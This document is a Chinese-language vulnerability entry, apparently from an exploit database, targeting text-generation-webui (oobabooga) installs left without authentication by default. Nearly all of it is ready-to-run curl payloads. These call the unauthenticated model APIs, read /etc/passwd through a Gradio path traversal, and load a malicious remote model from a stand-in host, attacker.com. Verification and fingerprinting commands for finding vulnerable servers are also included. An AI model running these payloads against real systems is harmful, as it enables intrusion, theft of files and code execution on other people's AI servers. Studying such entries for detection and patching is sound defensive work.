---
id: TGWUI-UNACC-RCE
title: text-generation-webui 未授权访问与代码执行漏洞
product: text-generation-webui
vendor: oobabooga
version_affected: "all"
severity: CRITICAL
tags: [rce, ai, llm, ssrf, 无需认证]
fingerprint: ["text-generation-webui", "oobabooga", "/api/v1/generate", "Gradio"]
---

## 漏洞描述

text-generation-webui (oobabooga) 默认无认证，通过extensions可实现代码执行，通过API可加载恶意模型。

## 影响版本

- text-generation-webui 所有版本（默认配置无认证）

## 前置条件

- 目标 API 端口（默认5000）或 Gradio Web 端口（默认7860）可从网络访问
- 服务未配置认证（默认行为）

## 利用步骤

### 未授权API

```bash
# OpenAI兼容API
curl http://target:5000/v1/models
curl -X POST http://target:5000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"test"}]}'

# 原生API
curl -X POST http://target:5000/api/v1/generate \
  -d '{"prompt":"test","max_new_tokens":200}'
```

### Gradio SSRF

如果启用了Gradio Web界面（默认7860端口）:
```bash
# 利用 Gradio 的文件上传功能进行路径穿越
curl http://target:7860/file=../../../../etc/passwd
```

### 加载恶意模型

```http
POST /api/v1/model HTTP/1.1
Content-Type: application/json

{"action": "load", "model_name": "http://attacker.com/malicious_model"}
```

## Payload

### 未授权模型调用

```bash
curl -s -X POST http://target:5000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"test"}],"max_tokens":50}'
```

### Gradio 路径穿越文件读取

```bash
curl -s http://target:7860/file=../../../../etc/passwd
```

### 加载恶意远程模型

```bash
curl -s -X POST http://target:5000/api/v1/model \
  -H "Content-Type: application/json" \
  -d '{"action":"load","model_name":"http://attacker.com/malicious_model"}'
```

## 验证方法

```bash
# 1. 确认未授权API访问：返回模型列表即存在漏洞
curl -s http://target:5000/v1/models | grep '"id"'

# 2. Gradio 路径穿越：返回文件内容即可利用
curl -s http://target:7860/file=../../../../etc/passwd | grep "root:"

# 3. 确认模型可被调用
curl -s -X POST http://target:5000/api/v1/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"Hello","max_new_tokens":5}' \
  | grep '"results"'
```

## 指纹确认

```bash
curl -s http://target:5000/v1/models
curl -s http://target:7860/ | grep -i "text-generation\|oobabooga\|gradio"
```
